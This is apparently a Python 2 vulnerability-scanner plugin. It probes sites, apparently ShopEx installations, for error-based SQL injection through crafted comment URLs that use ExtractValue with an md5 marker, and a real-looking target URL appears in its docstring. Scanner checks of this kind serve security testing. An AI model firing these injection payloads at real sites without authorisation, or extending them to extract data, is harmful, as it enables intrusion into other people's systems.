#!/usr/bin/env python
# -*- coding: utf-8 -*-
from lib.common import *

def run_domain(http,ob):
    '''
    http://www.e729.cn/comment-8967'/**/and/**/ExtractValue(0x64,concat(0x01,(select/**/md5(333))))/**/order/**/by/**/'1-ask-commentlist.html
    '''
    list = []
    try:
        domain = ob['domain']
        detail = u''
        detail = detail.encode('utf8')
    
        url = "%s://%s%s" % (ob['scheme'],ob['domain'],ob['base_path'])
        expurl="%s%s"%(url,"index.php?comment-2'/**/and/**/ExtractValue(0x64,concat(0x01,(select/**/md5(333))))/**/order/**/by/**/'1-ask-commentlist.html")
        res, content = requestUrl(http,expurl,ob['task_id'],ob['domain_id'])
        if content.find('310dcbbf4cce62f762a2aaa148d556b')>=0:
            request = getRequest(expurl)
            response = getResponse(res)
            list.append(getRecord(ob,ob['scheme']+"://"+ob['domain'],ob['level'],detail,request,response))
        else:
            expurl1="%s%s"%(url,"/comment-8967'/**/and/**/ExtractValue(0x64,concat(0x01,(select/**/md5(333))))/**/order/**/by/**/'1-ask-commentlist.html")
            res, content = requestUrl(http,expurl1,ob['task_id'],ob['domain_id'])
            if content.find('310dcbbf4cce62f762a2aaa148d556b')>=0:
                request = getRequest(expurl1)
                response = getResponse(res)
                list.append(getRecord(ob,ob['scheme']+"://"+ob['domain'],ob['level'],detail,request,response))
    except Exception,e:
        logging.getLogger().error("File:shopexsqlinjectionscript.py, run_domain function :" + str(e) + ",task id:" + ob['task_id'] + ",domain id:" + ob['domain_id'])
        write_scan_log(ob['task_id'],ob['domain_id'],"File:shopexsqlinjectionscript.py, run_domain function :" + str(e))
    #end try
    
    return list
#end def